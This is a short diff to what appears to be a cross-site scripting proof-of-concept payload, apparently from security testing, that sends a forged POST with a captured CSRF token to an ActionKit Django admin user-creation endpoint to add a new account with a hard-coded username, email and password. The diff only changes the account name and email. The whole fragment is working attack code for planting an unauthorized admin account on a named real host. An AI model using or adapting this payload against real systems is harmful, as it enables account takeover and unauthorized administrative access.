@@ -20,7 +20,7 @@ fetch('https://insight.actionkit.com/admin/auth/user/add/', {
       headers: {
         "Content-Type": "application/x-www-form-urlencoded"
       },
-      body: `csrfmiddlewaretoken=${encodeURIComponent(csrfToken)}&email=trey%2Bxss%40inspectiv.com&username=Trey_xss&password1=nLCw4SDzV%26IQtn%25e&password2=nLCw4SDzV%26IQtn%25e&_save=Save`
+      body: `csrfmiddlewaretoken=${encodeURIComponent(csrfToken)}&email=trey%2Bxss2%40inspectiv.com&username=Trey_xss2&password1=nLCw4SDzV%26IQtn%25e&password2=nLCw4SDzV%26IQtn%25e&_save=Save`
     });
   })
   .then(response => response.text())  // Process POST response
